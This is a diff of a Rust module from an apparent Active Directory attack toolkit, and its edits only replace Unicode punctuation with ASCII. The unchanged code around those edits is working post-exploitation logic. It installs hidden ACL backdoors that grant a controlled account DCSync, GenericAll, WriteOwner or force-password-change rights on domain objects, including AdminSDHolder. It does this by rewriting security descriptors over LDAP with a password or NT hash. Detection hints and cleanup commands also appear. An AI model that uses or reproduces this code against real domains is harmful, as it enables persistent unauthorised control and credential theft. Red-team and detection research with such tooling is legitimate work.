@@ -1,4 +1,4 @@
-//! ACL-based persistence — add hidden ACEs to domain objects.
+//! ACL-based persistence -- add hidden ACEs to domain objects.
 //!
 //! Grants a controlled account (trustee) DCSync rights, GenericAll,
 //! or other dangerous permissions on AD objects for persistent access.
@@ -50,13 +50,13 @@ impl std::fmt::Display for AclBackdoorType {
 /// Extended Right GUID: User-Force-Change-Password
 const GUID_USER_FORCE_CHANGE_PASSWORD: &str = "00299570-246d-11d0-a768-00aa006e0529";
 
-/// ADS_RIGHT_DS_CONTROL_ACCESS — required mask for extended rights ACEs
+/// ADS_RIGHT_DS_CONTROL_ACCESS -- required mask for extended rights ACEs
 const ADS_RIGHT_DS_CONTROL_ACCESS: u32 = 0x00000100;
 
 /// Install an ACL-based backdoor on an AD object.
 /// Resolves the trustee's SID from AD, reads the target object's current
 /// `nTSecurityDescriptor` via LDAP, appends the appropriate ACE(s), and
-/// writes the modified descriptor back — producing a real persistent ACL entry.
+/// writes the modified descriptor back -- producing a real persistent ACL entry.
 pub async fn install_acl_backdoor(
     config: &ForgeConfig,
     target_dn: &str,
@@ -108,7 +108,7 @@ pub async fn install_acl_backdoor(
     // Build cleanup commands (always generated for operator reference)
     if config.password.is_none() {
         warn!(
-            "[acl] Password not provided — cleanup commands will contain '<PASSWORD>' placeholder; replace before use."
+            "[acl] Password not provided -- cleanup commands will contain '<PASSWORD>' placeholder; replace before use."
         );
     }
     let cleanup_password = config.password.as_deref().unwrap_or("<PASSWORD>");
@@ -122,7 +122,7 @@ pub async fn install_acl_backdoor(
         &config.dc_ip,
     );
 
-    // ── Real LDAP write ──────────────────────────────────────────────────
+    // -- Real LDAP write --------------------------------------------------
     let mut ldap = if let Some(hash) = config.nt_hash.as_deref() {
         LdapSession::connect_with_hash(&config.dc_ip, &config.domain, &config.username, hash, false)
             .await?
@@ -172,8 +172,8 @@ pub async fn install_acl_backdoor(
          {}\n\
          \n\
          Detection:\n\
-         - Event ID 5136 (Directory Service Changes) — look for nTSecurityDescriptor modifications\n\
-         - Event ID 4662 — look for DS-Replication-Get-Changes property access\n\
+         - Event ID 5136 (Directory Service Changes) -- look for nTSecurityDescriptor modifications\n\
+         - Event ID 4662 -- look for DS-Replication-Get-Changes property access\n\
          - Periodically audit ACLs on sensitive objects (domain root, AdminSDHolder, DC OUs)\n\
          - Compare ACL snapshots with tools like ADACLScanner or BloodHound\n\
          \n\
@@ -187,7 +187,7 @@ pub async fn install_acl_backdoor(
 
     let message = if write_success {
         format!(
-            "ACL backdoor ({}) successfully applied — '{}' now has {} on '{}'",
+            "ACL backdoor ({}) successfully applied -- '{}' now has {} on '{}'",
             backdoor_type, trustee, backdoor_type, effective_target
         )
     } else {
@@ -209,8 +209,8 @@ pub async fn install_acl_backdoor(
         success: write_success,
         ticket_data: None,
         persistence_result: Some(PersistenceResult {
-            mechanism: format!("ACL Backdoor — {}", backdoor_type),
-            target: format!("{} → {}", trustee, effective_target),
+            mechanism: format!("ACL Backdoor -- {}", backdoor_type),
+            target: format!("{} -> {}", trustee, effective_target),
             success: write_success,
             details,
             cleanup_command: Some(cleanup_cmds),
@@ -283,7 +283,7 @@ fn build_aces_for_backdoor_type(
 
 /// Append raw ACE bytes to the DACL of an NT Security Descriptor.
 /// Handles the binary SECURITY_DESCRIPTOR_RELATIVE layout:
-/// - Reads OffsetDacl from the SD header (bytes 16–19)
+/// - Reads OffsetDacl from the SD header (bytes 16--19)
 /// - Reads AclSize and AceCount from the ACL header at OffsetDacl
 /// - Inserts the new ACE bytes at the end of the existing ACEs
 /// - Patches AclSize (+= ace_bytes.len()) and AceCount (+= count_of_new_aces)
@@ -295,7 +295,7 @@ fn append_aces_to_dacl(sd: &[u8], ace_bytes: &[u8]) -> std::result::Result<Vec<u
 
     let control = u16::from_le_bytes([sd[2], sd[3]]);
     if control & 0x0004 == 0 {
-        return Err("SE_DACL_PRESENT not set — no DACL to modify".to_string());
+        return Err("SE_DACL_PRESENT not set -- no DACL to modify".to_string());
     }
 
     let offset_dacl = u32::from_le_bytes([sd[16], sd[17], sd[18], sd[19]]) as usize;
@@ -346,7 +346,7 @@ fn append_aces_to_dacl(sd: &[u8], ace_bytes: &[u8]) -> std::result::Result<Vec<u
     new_sd[offset_dacl + 5] = new_count_le[1];
 
     // Adjust any SD header offset fields (OffsetOwner/Group/Sacl/Dacl) that point
-    // at or past insert_at — they must be shifted by ace_bytes.len()
+    // at or past insert_at -- they must be shifted by ace_bytes.len()
     // NOTE: OffsetDacl itself is NOT shifted since the DACL header starts *before*
     // insert_at; only offsets to regions *after* the inserted bytes need shifting.
     let shift = ace_bytes.len() as u32;
@@ -403,7 +403,7 @@ fn describe_aces(
         ),
         AclBackdoorType::WriteOwner => format!(
             "ACE: ALLOW {} WriteOwner (0x{:08X}) on '{}'\n\
-             Can take ownership then grant full WriteDACL → GenericAll.",
+             Can take ownership then grant full WriteDACL -> GenericAll.",
             trustee, ADS_RIGHT_WRITE_OWNER, target_dn,
         ),
         AclBackdoorType::ForceChangePassword => format!(
@@ -439,9 +439,9 @@ pub async fn install_adminsdholder_backdoor(
     install_acl_backdoor(config, &sdholder_dn, trustee).await
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Cleanup Command Generator
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 fn generate_cleanup_commands(
     backdoor_type: &AclBackdoorType,
@@ -524,7 +524,7 @@ pub fn build_ace_bytes(
             ace.extend_from_slice(guid);
         }
 
-        // InheritedObjectType — not set (no sub-object scoping)
+        // InheritedObjectType -- not set (no sub-object scoping)
         // (only present if flags & 0x02)
     }
 
@@ -573,7 +573,7 @@ pub fn guid_string_to_bytes(guid: &str) -> Result<[u8; 16]> {
     // Data3 (2 bytes LE)
     out[6] = raw[7];
     out[7] = raw[6];
-    // Data4 (8 bytes BE — as-is)
+    // Data4 (8 bytes BE -- as-is)
     out[8..16].copy_from_slice(&raw[8..16]);
 
     Ok(out)
